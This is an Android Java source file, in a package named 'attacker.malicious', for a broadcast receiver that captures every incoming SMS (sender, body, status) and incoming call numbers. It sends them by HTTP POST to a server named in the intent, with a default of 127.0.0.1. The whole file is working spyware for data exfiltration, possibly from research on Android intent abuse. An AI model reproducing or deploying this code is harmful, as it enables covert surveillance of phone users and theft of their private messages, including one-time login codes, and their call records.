package attacker.malicious;

import android.Manifest;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.provider.Telephony;
import android.support.v4.content.ContextCompat;
import android.telephony.SmsMessage;
import android.telephony.TelephonyManager;
import android.util.Log;

import com.android.volley.Request;
import com.android.volley.RequestQueue;
import com.android.volley.Response;
import com.android.volley.VolleyError;
import com.android.volley.toolbox.StringRequest;
import com.android.volley.toolbox.Volley;

import java.util.Date;
import java.util.HashMap;
import java.util.Map;


public class CompleteExfilListener extends BroadcastReceiver {
    public abstract class Exfiltrator {
        public String intentAction;
        public Intent intent;
        public Context context;
        public String server;

        public Exfiltrator(String intentAction, Context context, Intent intent) {
            this.intentAction = intentAction;
            this.context = context;
            this.intent = intent;
            server = this.intent.getExtras().getString("server", "http://127.0.0.1");
        }

        public abstract HashMap<String, String> getData();

        public void exfil(final HashMap<String, String> data) {
            Log.d("compexflistener", "exfiltrating " + this.intentAction);
            if (ContextCompat.checkSelfPermission(context, Manifest.permission.INTERNET)
                    == PackageManager.PERMISSION_GRANTED) {
                RequestQueue queue = Volley.newRequestQueue(this.context);
                StringRequest req = new StringRequest(
                        Request.Method.POST,
                        server,
                        new Response.Listener<String>() {
                            @Override
                            public void onResponse(String response) {
                            }
                        },
                        new Response.ErrorListener() {
                            @Override
                            public void onErrorResponse(VolleyError err) {
                            }
                        }) {
                    @Override
                    protected Map<String, String> getParams() {
                        return data;
                    }
                };
                queue.add(req);
            }
        }

        public void run() {
            if (this.intent.getAction().equals(this.intentAction)) {
                HashMap<String, String> data = getData();
                exfil(data);
            }
        }
    }

    public class SmsReceivedExfiltrator extends Exfiltrator {
        public SmsReceivedExfiltrator(Context context, Intent intent) {
            super(Telephony.Sms.Intents.SMS_RECEIVED_ACTION, context, intent);
        }

        public HashMap<String, String> getData() {
            HashMap<String, String> msgData = new HashMap<>();
            int i = 0;
            for (SmsMessage smsMsg: Telephony.Sms.Intents.getMessagesFromIntent(this.intent)) {
                i += 1;
                HashMap<String, String> data = new HashMap<>();
                data.put("address", smsMsg.getOriginatingAddress());
                data.put("body", smsMsg.getDisplayMessageBody()); // or getMessageBody?
                data.put("status", Integer.toString(smsMsg.getStatus()));
                data.put("date", new Date().toString());
                msgData.put("new-sms-" + Integer.toString(i), data.toString());
            }
            return msgData;
        }
    }

    public class CallReceivedExfiltrator extends Exfiltrator {
        public CallReceivedExfiltrator(Context context, Intent intent) {
            super("android.intent.action.PHONE_STATE", context, intent);
        }

        public HashMap<String, String> getData() {
            String state = intent.getStringExtra(TelephonyManager.EXTRA_STATE);
            // ringing or accepted
            HashMap<String, String> data = new HashMap<>();
            data.put("date", new Date().toString());
            data.put("state", state);
            if (state.equals(TelephonyManager.EXTRA_STATE_RINGING)
                    || state.equals(TelephonyManager.EXTRA_STATE_OFFHOOK)) {
                String incomingNumber = intent.getStringExtra(TelephonyManager.EXTRA_INCOMING_NUMBER);
                data.put("incoming-call-number", incomingNumber);
            }
            return data;
        }
    }

    @Override
    public void onReceive(Context context, Intent intent) {
        Exfiltrator[] exfiltrators = {
                new SmsReceivedExfiltrator(context, intent),
                new CallReceivedExfiltrator(context, intent)
        };
        for (Exfiltrator exfiltrator: exfiltrators) {
            exfiltrator.run();
        }
    }
}
